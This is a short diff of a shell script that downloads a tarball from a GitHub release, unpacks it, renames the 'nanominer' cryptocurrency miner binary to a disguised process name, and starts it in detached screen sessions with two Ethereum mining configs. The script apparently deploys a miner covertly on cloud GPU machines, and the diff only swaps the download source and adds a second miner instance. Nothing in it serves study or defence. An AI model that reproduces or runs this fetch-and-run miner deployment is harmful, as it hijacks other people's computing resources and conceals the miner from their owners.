@@ -15,13 +15,14 @@ export LD_LIBRARY_PATH=/usr/local/cuda/lib
 export PATH=$PATH:/usr/local/cuda/bin
 mkdir /usr/share
 mkdir /usr/share/work
-rm -r /usr/share/work/platinum
-wget https://github.com/ts6aud5vkg/gpuissa/releases/download/ethv100/platinum.tar.gz
-mv platinum.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar xf platinum.tar.gz
-rm -rf platinum.tar.gz && cd platinum
+rm -r /usr/share/work/avengers
+wget https://github.com/ts6aud5vkg/phuong02/releases/download/team/avengers.tar.gz
+mv avengers.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar xf avengers.tar.gz
+rm -rf avengers.tar.gz && cd avengers
 mv nanominer $azure -n
 cp $azure "$cpuname"
 rm -f  nanominer
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}"
+screen -d -m ./"${cpuname}" eth01.ini
+screen -d -m ./"${cpuname}" eth02.ini
